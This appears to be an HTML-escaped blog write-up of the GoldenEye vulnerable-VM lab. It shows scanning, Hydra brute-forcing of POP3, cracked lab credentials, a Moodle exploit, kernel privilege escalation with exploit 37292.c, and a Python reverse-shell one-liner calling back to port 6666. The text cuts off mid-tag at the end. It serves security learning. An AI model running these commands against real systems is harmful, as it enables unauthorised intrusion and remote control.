Summary&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/GodenEye.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/1675389865498.png&quot;],[0,&quot;img/1675389870691.png&quot;],[0,&quot;img/1675389847203.png&quot;],[0,&quot;img/1675390018821.png&quot;],[0,&quot;img/1675390162371.png&quot;],[0,&quot;img/1675390345344.png&quot;],[0,&quot;img/1675390355645.png&quot;],[0,&quot;img/1675390815369.png&quot;],[0,&quot;img/1675391828534.png&quot;],[0,&quot;img/1675391692695.png&quot;],[0,&quot;img/1675393082037.png&quot;],[0,&quot;img/1675394170762.png&quot;],[0,&quot;img/1675394314719.png&quot;],[0,&quot;img/1675394962917.png&quot;],[0,&quot;img/1675395021833.png&quot;],[0,&quot;img/1675395868856.png&quot;],[0,&quot;img/1675396334057.png&quot;],[0,&quot;img/1675396627851.png&quot;],[0,&quot;img/1675845464385.png&quot;],[0,&quot;img/1675905870571.png&quot;],[0,&quot;img/1675905558594.png&quot;],[0,&quot;img/1675906171442.png&quot;],[0,&quot;img/1675911223227.png&quot;],[0,&quot;img/1675912183070.png&quot;],[0,&quot;img/1675912534581.png&quot;],[0,&quot;img/1675912972431.png&quot;],[0,&quot;img/1675913050473.png&quot;],[0,&quot;img/1675914702007.png&quot;],[0,&quot;img/1675329659408.png&quot;],[0,&quot;img/1675329715883.png&quot;]]],&quot;digest&quot;:[0,&quot;355366de80df8cb1&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;information-gathering\&quot;&gt;Information gathering&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#information-gathering\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap  -sV -O -Pn -T4 192.168.124.44 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script vuln 192.168.124.44 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.44:80/ /usr/share/wordlists/dirb/big.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;The nmap scanning result is as enclosure.\nThe dirb found nothing.&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;method-1\&quot;&gt;Method-1&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-1\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;step-1-intrude-the-login-pagefailed\&quot;&gt;step-1 Intrude the login page(failed)&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#step-1-intrude-the-login-pagefailed\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675389865498.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675389870691.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nI find its login page,try to intrude it.\nAuthorization is made up of user:password.\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675389847203.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675390018821.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675390162371.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nFind nothing.&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;step-2-view-home-page-source\&quot;&gt;step-2 View home page source.&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#step-2-view-home-page-source\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675390345344.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675390355645.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;code&gt;&amp;#x26;#73;&amp;#x26;#110;&amp;#x26;#118;&amp;#x26;#105;&amp;#x26;#110;&amp;#x26;#99;&amp;#x26;#105;&amp;#x26;#98;&amp;#x26;#108;&amp;#x26;#101;&amp;#x26;#72;&amp;#x26;#97;&amp;#x26;#99;&amp;#x26;#107;&amp;#x26;#51;&amp;#x26;#114;&lt;/code&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675390815369.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nIt’s unicode,decode it as html,I get ‘InvincibleHack3r’.And in source page,i known that the user is boris.Attention please,‘boris’ not ‘Boris’.\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675391828534.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;View source code of this page.In the end i find an explanatory note.\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675391692695.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;step-3-pop3\&quot;&gt;step-3 POP3&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#step-3-pop3\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;From nmap result,55007 is pop3 port.\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675393082037.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nUse burpsuite to send packet.It response us slowly,be pacient.\nIntrude pop3 password.I guess its username is ‘natalya’ or ‘boris’.&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hydra -s 55007 -L username.txt  -P /usr/share/set/src/fasttrack/wordlist.txt -e nsr -t 22 192.168.124.44 pop3&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Then I get password.Attention,intrude it successfully only with /usr/share/set/src/fasttrack/wordlist.txt.\n&lt;code&gt;natalya:bird&lt;/code&gt;\n&lt;code&gt;boris:secret1!&lt;/code&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;step-4-login-mailbox\&quot;&gt;step-4 Login mailbox&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#step-4-login-mailbox\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;telnet 192.168.124.44 55007&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;user natalya&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;pass bird&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;list&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;+OK 2 messages:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;1 631&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;2 1048&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;retr 1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;I find two mails.And the second is critical.\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675394170762.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675394314719.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;step-5-login-in-gnocertdir\&quot;&gt;step-5 Login in gnocertdir&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#step-5-login-in-gnocertdir\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Edit /etc/hosts\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675394962917.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nVisit servernaya-station.com/gnocertdir\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675395021833.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nThe username and password has be shown in the second mail.\nI find a mail of doak.Try to intrude doak’s mailbox.\nThen Get doak:goat\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675395868856.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nFind another account of this system in doak’s mailbox.\nusername: dr_doak\npassword: 4England!\nSign in system with this account.\nI find a file named secret.txt.\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675396334057.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nDownload picture for-007.jpg\nOpen this picture in notepad++,something intersting show.\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675396627851.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nDecode ‘eFdpbnRlcjE5OTV4IQ==‘,get ‘xWinter1995x!‘&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;step-6-moodlecms-exploitation\&quot;&gt;step-6 Moodlecms exploitation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#step-6-moodlecms-exploitation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;xWinter1995x! is the password of admin\nThe version of moodle cms is 2.2.3\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675845464385.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nIt seems that we can use msf to get shell.\nBefore exploit it,set text editor.\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675905870571.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675905558594.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;step-7-privilege-escalation\&quot;&gt;Step-7 Privilege escalation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#step-7-privilege-escalation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;It’s www-data now\nSearch vulnerability to escalate privilege.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit linux ubuntu 3.13&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675906171442.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nUse 37292.c\nThe absolute path of shellcode is /usr/share/exploitdb/exploits/\nmove it to /home/kali\nedit  37292.c,because there is no gcc in  target host .Use cc\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675911223227.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;change shell to meterpreter&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;use post/multi/manage/shell_to_meterpreter&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;set session 1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;exploit&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sessions -i 2&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;upload 37292.c&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;How to use 37292.c will be described in it’s code.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chmod 777 37292.c&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cc -o exp 37292.c&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./exp&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675912183070.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;method-2-reverse-shell\&quot;&gt;Method-2 Reverse shell&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-2-reverse-shell\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;step-6-moodlecms-exploitation-1\&quot;&gt;Step-6 Moodlecms exploitation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#step-6-moodlecms-exploitation-1\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;In ‘Site administration-Server-System paths’,I find a web which can be used to upload shellcode.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.168.124.4\&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675912534581.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nlisten port 6666 in vps.\n&lt;code&gt;nc lvnp 6666&lt;/code&gt;\ncheck spell\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675912972431.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nThen will get a shell\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img 